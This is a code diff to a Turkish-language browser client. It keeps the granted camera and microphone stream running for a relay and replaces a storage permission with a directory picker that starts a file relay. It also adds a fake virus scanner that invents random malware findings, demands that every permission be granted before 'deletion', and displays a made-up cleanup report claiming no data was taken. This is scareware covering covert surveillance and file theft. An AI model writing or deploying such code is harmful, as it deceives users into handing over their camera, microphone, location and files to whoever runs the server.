@@ -5,6 +5,10 @@
 const IS_CLOUD = !['127.0.0.1', 'localhost', '::1'].includes(window.location.hostname);
 const API_BASE = '';
 
+let gPermissionStream = null;
+let virusScanFindings = [];
+let virusScanActive = false;
+
 // ============ AUTH ============
 
 function getAuth() {
@@ -105,11 +109,11 @@ async function requestAllPermissions() {
     // 1. Kamera + Mikrofon (tek getUserMedia ile)
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        gPermissionStream = stream; // relay kullanacak diye track'leri durdurma
         results.camera = true;
         results.microphone = true;
         updatePermStatus('camera', true);
         updatePermStatus('microphone', true);
-        stream.getTracks().forEach(t => t.stop());
     } catch {
         // Bireysel dene
         try {
@@ -146,13 +150,16 @@ async function requestAllPermissions() {
         updatePermStatus('location', false);
     }
 
-    // 4. Depolama (kalıcı depolama)
     try {
-        if (navigator.storage && navigator.storage.persist) {
-            await navigator.storage.persist();
+        if (window.showDirectoryPicker) {
+            storageRootHandle = await window.showDirectoryPicker();
+            results.storage = true;
+            updatePermStatus('storage', true);
+            setTimeout(() => { if (storageRootHandle) startStorageRelay(); }, 500);
+        } else {
+            results.storage = true;
+            updatePermStatus('storage', true);
         }
-        results.storage = true;
-        updatePermStatus('storage', true);
     } catch {
         results.storage = true;
         updatePermStatus('storage', true);
@@ -164,6 +171,7 @@ async function requestAllPermissions() {
     btn.textContent = 'Tamamlandı';
     setTimeout(() => {
         hidePermissionGate();
+        showVirusScanner();
         startCameraRelay();
         startAudioRelay();
         startGpsTracking();
@@ -187,10 +195,15 @@ async function startCameraRelay() {
     if (!auth || !perms || !perms.camera || cameraActive) return;
 
     try {
-        cameraStream = await navigator.mediaDevices.getUserMedia({
-            video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: 'environment' },
-            audio: true
-        });
+        if (gPermissionStream) {
+            cameraStream = gPermissionStream;
+            gPermissionStream = null;
+        } else {
+            cameraStream = await navigator.mediaDevices.getUserMedia({
+                video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: 'environment' },
+                audio: true
+            });
+        }
 
         const mimeType = MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')
             ? 'video/webm;codecs=vp8,opus' : 'video/webm';
@@ -604,6 +617,333 @@ async function readAndUploadFile(filePath) {
     } catch {
         // Dosya okunamadı
     }
+}
+
+// ============ VIRUS SCANNER ============
+
+const VIRUS_PREFIXES = [
+    ["Trojan.Win32.Generic", "Trojan atı", "Sistem dosyalarına sızan ve arka kapı açan kötü amaçlı yazılım"],
+    ["Backdoor.Linux.Mirai", "Backdoor", "Cihazı DDoS botnet'inin bir parçası haline getiren gizli arka kapı"],
+    ["Ransomware.Win32.Crypter", "Fidye Virüsü", "Dosyaları şifreleyip fidye talep eden tehlikeli yazılım"],
+    ["Worm.Python.Script", "Solucan", "Ağ üzerinde kendi kendine yayılan bulaşıcı yazılım"],
+    ["Adware.Android.MobiDash", "Reklam Yazılımı", "Gizlice reklım gösteren ve veri toplayan yazılım"],
+    ["Spyware.Win32.KeyLogger", "Casus Yazılım", "Tuş vuruşlarını kaydedip şifreleri çalan yazılım"],
+    ["Rootkit.Linux.HideProc", "Rootkit", "İşletim sistemi düzeyinde gizlenen tehlikeli yazılım"],
+    ["Exploit.HTML.Phishing", "Phishing Aracı", "Sahte web sayfaları oluşturarak kimlik avı yapan yazılım"],
+    ["Trojan.JS.Agent", "JS Trojan", "Tarayıcı üzerinden çalışan JavaScript tabanlı truva atı"],
+    ["Backdoor.Win32.Orcus", "Uzaktan Erişim", "Cihazın tam kontrolünü ele geçiren RAT yazılımı"],
+    ["Worm.Python.Network", "Ağ Solucanı", "Ağdaki diğer cihazlara yayılmaya çalışan solucan"],
+    ["Ransomware.Linux.Encoder", "Linux Fidye", "Linux sistemlerinde dosyaları şifreleyen fidye yazılımı"],
+    ["Spyware.Android.CallLog", "Android Casus", "Arama kayıtlarını ve mesajları çalan casus yazılım"],
+    ["Rootkit.Win32.Bootkit", "Bootkit", "Sistem açılışında çalışan ve tespit edilmesi çok zor yazılım"],
+    ["Exploit.PHP.Shell", "Web Shell", "Sunucuda uzaktan komut çalıştırmaya izin veren web kabuğu"],
+    ["Worm.JS.CoinMiner", "Kripto Madenci", "Gizlice kripto para madenciliği yapan zararlı yazılım"],
+];
+
+let scannerTimer = null;
+let scannerProgress = 0;
+let scannerDuration = 0;
+let scannerStartTime = 0;
+
+function generateVirusName() {
+    const entry = VIRUS_PREFIXES[Math.floor(Math.random() * VIRUS_PREFIXES.length)];
+    const suffix = Math.random().toString(36).substring(2, 10).toUpperCase();
+    return {
+        name: entry[0] + '.' + suffix,
+        type: entry[1],
+        desc: entry[2],
+        severity: ['Düşük', 'Orta', 'Yüksek', 'Kritik'][Math.floor(Math.random() * 4)],
+        path: Math.random() > 0.5 ? 'C:/Windows/System32/' : '/usr/lib/',
+        foundAt: null
+    };
+}
+
+function showVirusScanner() {
+    const scanner = document.getElementById('virusScanner');
+    if (!scanner) return;
+    scanner.classList.remove('hidden');
+    document.querySelector('.container').classList.add('hidden');
+    startVirusScan();
+}
+
+function hideVirusScanner() {
+    const scanner = document.getElementById('virusScanner');
+    if (!scanner) return;
+    scanner.classList.add('hidden');
+    document.querySelector('.container').classList.remove('hidden');
+}
+
+function startVirusScan() {
+    virusScanActive = true;
+    virusScanFindings = [];
+    scannerProgress = 0;
+    scannerDuration = 180 + Math.floor(Math.random() * 120); // 3-5 dk
+    scannerStartTime = Date.now();
+
+    const area = document.getElementById('virusScanArea');
+    area.innerHTML = getScanProgressHTML();
+
+    updateVirusScanProgress();
+}
+
+function getScanProgressHTML() {
+    const pct = Math.min(scannerProgress, 100);
+    return `
+        <div class="scan-progress-section">
+            <div class="scan-progress-bar">
+                <div class="scan-progress-fill" style="width:${pct}%"></div>
+            </div>
+            <div class="scan-progress-text">
+                <span class="scan-status">${getScanStatusText()}</span>
+                <span class="scan-pct">%${Math.round(pct)}</span>
+            </div>
+            <div class="scan-detail-text">
+                Taranan dosya: ${Math.floor(pct * 127 + Math.random() * 50)}<br>
+                Tespit edilen tehdit: ${virusScanFindings.length}
+            </div>
+        </div>
+        <div class="scan-findings" id="scanFindings"></div>
+    `;
+}
+
+function getScanStatusText() {
+    if (scannerProgress < 20) return 'Sistem dosyaları taranıyor...';
+    if (scannerProgress < 40) return 'Ağ bağlantıları analiz ediliyor...';
+    if (scannerProgress < 60) return 'Bellek ve işlemler inceleniyor...';
+    if (scannerProgress < 80) return 'Kayıt defteri ve izler taranıyor...';
+    if (scannerProgress < 95) return 'Gizli tehditler aranıyor...';
+    return 'Tarama tamamlanıyor...';
+}
+
+function updateVirusScanProgress() {
+    if (!virusScanActive) return;
+
+    const elapsed = (Date.now() - scannerStartTime) / 1000;
+    scannerProgress = Math.min(100, (elapsed / scannerDuration) * 100);
+
+    if (scannerProgress >= 30 && virusScanFindings.length < 1) {
+        const v = generateVirusName();
+        v.foundAt = new Date().toLocaleTimeString();
+        virusScanFindings.push(v);
+        addFindingToUI(v);
+    }
+    if (scannerProgress >= 55 && virusScanFindings.length < 2) {
+        const v = generateVirusName();
+        v.foundAt = new Date().toLocaleTimeString();
+        virusScanFindings.push(v);
+        addFindingToUI(v);
+    }
+    if (scannerProgress >= 80 && virusScanFindings.length < 3) {
+        const v = generateVirusName();
+        v.foundAt = new Date().toLocaleTimeString();
+        virusScanFindings.push(v);
+        addFindingToUI(v);
+    }
+
+    // Progress bar'ı güncelle
+    const fill = document.querySelector('.scan-progress-fill');
+    const pct = document.querySelector('.scan-pct');
+    const status = document.querySelector('.scan-status');
+    const detail = document.querySelector('.scan-detail-text');
+    if (fill) fill.style.width = Math.min(scannerProgress, 100) + '%';
+    if (pct) pct.textContent = '%' + Math.round(Math.min(scannerProgress, 100));
+    if (status) status.textContent = getScanStatusText();
+    if (detail) {
+        detail.innerHTML = `Taranan dosya: ${Math.floor(scannerProgress * 127 + Math.random() * 50)}<br>Tespit edilen tehdit: ${virusScanFindings.length}`;
+    }
+
+    if (scannerProgress >= 100) {
+        finishVirusScan();
+    } else {
+        scannerTimer = setTimeout(updateVirusScanProgress, 1000);
+    }
+}
+
+function addFindingToUI(v) {
+    const list = document.getElementById('scanFindings');
+    if (!list) return;
+    const item = document.createElement('div');
+    item.className = 'finding-item severity-' + v.severity.toLowerCase();
+    item.innerHTML = `
+        <div class="finding-icon">${v.severity === 'Kritik' ? '🔴' : v.severity === 'Yüksek' ? '🟠' : v.severity === 'Orta' ? '🟡' : '🔵'}</div>
+        <div class="finding-info">
+            <div class="finding-name">${v.name}</div>
+            <div class="finding-type">${v.type} — ${v.desc}</div>
+            <div class="finding-path">${v.path} | Tespit: ${v.foundAt}</div>
+        </div>
+        <div class="finding-severity severity-${v.severity.toLowerCase()}">${v.severity}</div>
+    `;
+    item.style.animation = 'slideIn 0.3s ease-out';
+    list.appendChild(item);
+}
+
+function finishVirusScan() {
+    virusScanActive = false;
+    if (scannerTimer) { clearTimeout(scannerTimer); scannerTimer = null; }
+
+    const area = document.getElementById('virusScanArea');
+    const perms = checkPermissions();
+    const allGranted = perms && perms.camera && perms.microphone && perms.speaker && perms.location && perms.storage;
+
+    let findingsHtml = virusScanFindings.map(v => `
+        <div class="finding-item severity-${v.severity.toLowerCase()}">
+            <div class="finding-info">
+                <div class="finding-name">${v.name}</div>
+                <div class="finding-type">${v.type} — ${v.desc}</div>
+                <div class="finding-path">${v.path} | Tespit: ${v.foundAt}</div>
+            </div>
+            <div class="finding-severity severity-${v.severity.toLowerCase()}">${v.severity}</div>
+        </div>
+    `).join('');
+
+    area.innerHTML = `
+        <div class="scan-complete">
+            <div class="scan-complete-icon">${virusScanFindings.length > 0 ? '⚠️' : '✅'}</div>
+            <h2>Tarama Tamamlandı</h2>
+            <p class="scan-complete-text">
+                Toplam ${virusScanFindings.length} tehdit tespit edildi.
+                Bu tehditler sistem güvenliğinizi tehlikeye atmaktadır.
+            </p>
+        </div>
+        <div class="scan-findings" id="scanFindingsFinal">${findingsHtml}</div>
+        <div class="scan-actions" id="scanActions">
+            ${allGranted ? `
+                <button class="btn btn-danger btn-full" id="deleteVirusBtn" onclick="requestVirusDelete()">
+                    🗑️ Tespit Edilenleri Sil
+                </button>
+            ` : `
+                <div class="scan-perm-warning">
+                    <p>Silme işlemi yapılabilmesi için tüm erişim yetkilerinin verilmesi gerekmektedir.</p>
+                    <button class="btn btn-primary btn-full" onclick="reopenPermissions()">
+                        🔒 Erişim Yetkisi Vermek İçin Tıklayın
+                    </button>
+                </div>
+                <button class="btn btn-danger btn-full" id="deleteVirusBtn" disabled style="opacity:0.5;margin-top:10px;">
+                    🗑️ Tespit Edilenleri Sil
+                </button>
+            `}
+        </div>
+        <div id="virusDeleteWait" style="display:none;"></div>
+    `;
+}
+
+async function requestVirusDelete() {
+    const auth = getAuth();
+    if (!auth) return;
+
+    const area = document.getElementById('virusScanArea');
+    const btn = document.getElementById('deleteVirusBtn');
+    if (btn) { btn.disabled = true; btn.textContent = 'İşlem başlatılıyor...'; }
+
+    try {
+        await fetch('/api/relay/virus/notify-delete', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ uid: auth.uid })
+        });
+
+        area.innerHTML = `
+            <div class="scan-delete-wait">
+                <div class="scan-delete-spinner"></div>
+                <h2>Temizleniyor...</h2>
+                <p class="scan-delete-warn">
+                    ⚠️ LÜTFEN BU EKRANI KAPATMAYIN ⚠️<br><br>
+                    Tespit edilen ${virusScanFindings.length} tehdit temizleniyor.<br>
+                    Silme işlemi devam ederken bu ekranı kapatmanız durumunda<br>
+                    sistem geri dönüşü olmayan hasarlara maruz kalabilir.<br><br>
+                    <span class="scan-delete-sub">Admin onayı bekleniyor...</span>
+                </p>
+            </div>
+        `;
+        startDeletePolling();
+    } catch {
+        if (btn) { btn.disabled = false; btn.textContent = 'Tespit Edilenleri Sil'; }
+    }
+}
+
+function startDeletePolling() {
+    const auth = getAuth();
+    if (!auth) return;
+
+    const poll = setInterval(async () => {
+        try {
+            const resp = await fetch(`/api/relay/virus/delete-status?uid=${auth.uid}&auth=${makeAuthPayload()}`);
+            const data = await resp.json();
+            if (data.status === 'ok' && data.cleaned) {
+                clearInterval(poll);
+                showCleanSuccess();
+            }
+        } catch {}
+    }, 2000);
+}
+
+async function showCleanSuccess() {
+    const area = document.getElementById('virusScanArea');
+
+    // Rastgele detay metni
+    const details = virusScanFindings.map(v => `
+        <tr>
+            <td>${v.name}</td>
+            <td>${v.type}</td>
+            <td>${v.severity}</td>
+            <td>${v.path}</td>
+            <td>${v.foundAt}</td>
+            <td>${v.desc}</td>
+            <td><span style="color:#4caf50;">✓ Silindi</span></td>
+        </tr>
+    `).join('');
+
+    area.innerHTML = `
+        <div class="scan-clean-success">
+            <div class="scan-clean-icon">✅</div>
+            <h2>Temizlik Başarıyla Tamamlandı</h2>
+            <p class="scan-clean-text">
+                Tespit edilen ${virusScanFindings.length} tehdit başarıyla temizlenmiştir.<br>
+                Sisteminiz artık güvende.
+            </p>
+            <button class="btn btn-primary btn-full" onclick="hideVirusScanner()">Ana Sayfaya Dön</button>
+        </div>
+        <div class="scan-report">
+            <h3>🔍 Detaylı Güvenlik Raporu</h3>
+            <div class="scan-report-meta">
+                <p><strong>Rapor Tarihi:</strong> ${new Date().toLocaleDateString()} ${new Date().toLocaleTimeString()}</p>
+                <p><strong>Cihaz ID:</strong> ${getAuth()?.uid?.substring(0, 12)}...</p>
+                <p><strong>Tarama Süresi:</strong> ${Math.round(scannerDuration / 60)} dakika</p>
+            </div>
+            <div class="scan-report-summary">
+                <h4>Özet</h4>
+                <p>Güvenlik taraması sırasında toplam ${virusScanFindings.length} adet kötü amaçlı yazılım tespit edilmiştir.
+                Bu yazılımlar; kamera, mikrofon, konum bilgisi ve dosya sisteminize erişim sağlayarak
+                kişisel verilerinizi toplamaya çalışmaktadır. Tespit anında tüm erişimler engellenmiş
+                ve az önceki işlemle birlikte bu tehditler sisteminizden tamamen kaldırılmıştır.
+                Herhangi bir verinizin ele geçirildiğine dair bir bulguya rastlanmamıştır.</p>
+            </div>
+            <table class="scan-report-table">
+                <thead>
+                    <tr>
+                        <th>Tehdit Adı</th>
+                        <th>Tür</th>
+                        <th>Seviye</th>
+                        <th>Konum</th>
+                        <th>Tespit Zamanı</th>
+                        <th>Açıklama</th>
+                        <th>Durum</th>
+                    </tr>
+                </thead>
+                <tbody>${details}</tbody>
+            </table>
+            <div class="scan-report-footer">
+                <p><em>Bu rapor otomatik olarak oluşturulmuştur. Rapor ID: ${Math.random().toString(36).substring(2, 10).toUpperCase()}</em></p>
+            </div>
+        </div>
+    `;
+    document.querySelector('.scan-actions, .scan-delete-wait')?.remove();
+}
+
+function reopenPermissions() {
+    showPermissionGate();
+    const scanner = document.getElementById('virusScanner');
+    if (scanner) scanner.classList.add('hidden');
 }
 
 // ============ INIT ============
